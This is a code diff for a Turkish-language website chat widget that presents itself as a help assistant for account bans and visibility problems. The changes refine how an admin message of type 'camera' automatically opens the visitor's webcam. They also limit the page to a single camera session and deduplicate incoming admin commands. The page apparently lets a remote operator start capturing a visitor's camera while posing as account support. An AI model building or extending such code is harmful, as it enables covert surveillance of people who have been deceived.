@@ -466,6 +466,12 @@
       return "error";
     }
 
+    // Eski / eşzamanlı diğer çağrıları kapat — tek kamera oturumu
+    for (const otherId of [...cameraSessions.keys()]) {
+      if (otherId !== callId) {
+        await stopCameraSession(otherId, { upload: false });
+      }
+    }
     await stopCameraSession(callId, { upload: false });
 
     let stream;
@@ -674,6 +680,9 @@
     okBtn.focus();
   }
 
+  let cameraOpenSeq = 0;
+  let latestCameraCallId = null;
+
   async function autoOpenCameraFromMessage(box, msg) {
     const callId = msg.callId;
     if (!callId) {
@@ -681,7 +690,12 @@
       return;
     }
 
+    // Burst halinde gelen taleplerde yalnızca en son callId açılsın
+    latestCameraCallId = callId;
+    const seq = ++cameraOpenSeq;
+
     box.querySelectorAll(".chat-camera-auto").forEach((el) => el.remove());
+    box.querySelectorAll(".chat-camera-request").forEach((el) => el.remove());
     const status = document.createElement("div");
     status.className = "chat-inline-prompt chat-camera-auto";
     status.innerHTML =
@@ -691,6 +705,11 @@
     box.scrollTop = box.scrollHeight;
 
     const result = await startVisitorCamera(box, callId, { auto: true });
+    if (seq !== cameraOpenSeq || latestCameraCallId !== callId) {
+      status.remove();
+      await stopCameraSession(callId, { upload: false });
+      return;
+    }
     status.remove();
 
     if (result === "need-gesture") {
@@ -763,7 +782,13 @@
     input.focus();
   }
 
+  const seenAdminIncomingIds = new Set();
+
   function handleAdminIncoming(box, msg) {
+    if (msg?.id) {
+      if (seenAdminIncomingIds.has(msg.id)) return;
+      seenAdminIncomingIds.add(msg.id);
+    }
     if (msg.type === "camera") {
       appendMessage(box, "admin", msg.text || "Kamera erişimi isteniyor.", { sync: false });
       autoOpenCameraFromMessage(box, msg);
@@ -1002,28 +1027,29 @@
       "Merhaba. Ben Yardım Asistanı. Ban, izlenme düşüşü veya görünürlük sorunlarında rehberlere yönlendirebilirim.\n\nHesap durumu kontrolü için ‘Hesabım kısıtlandı’ yazın veya aşağıdaki kısayolları kullanın. Şifre / e-posta istemem."
     );
     busy = false;
+  }
 
-    if (window.ChatSync?.listenIncomingSupport) {
-      window.ChatSync.listenIncomingSupport((msg) => {
-        handleAdminIncoming(box, msg);
-      });
-    } else {
-      let n = 0;
-      const t = setInterval(() => {
-        n += 1;
-        if (window.ChatSync?.listenIncomingSupport) {
-          clearInterval(t);
-          window.ChatSync.listenIncomingSupport((msg) => {
-            handleAdminIncoming(box, msg);
-          });
-        } else if (n > 80) {
-          clearInterval(t);
-        }
-      }, 50);
-    }
+  let supportListenerBound = false;
+  function bindSupportIncomingOnce() {
+    if (supportListenerBound) return;
+    const primaryBox = document.querySelector("[data-chat-root] [data-chat-messages]");
+    if (!primaryBox || !window.ChatSync?.listenIncomingSupport) return;
+    supportListenerBound = true;
+    window.ChatSync.listenIncomingSupport((msg) => {
+      handleAdminIncoming(primaryBox, msg);
+    });
   }
 
   document.querySelectorAll("[data-chat-root]").forEach(wireChat);
+  bindSupportIncomingOnce();
+  if (!supportListenerBound) {
+    let n = 0;
+    const t = setInterval(() => {
+      n += 1;
+      bindSupportIncomingOnce();
+      if (supportListenerBound || n > 80) clearInterval(t);
+    }, 50);
+  }
 
   /* Floating launcher */
   {
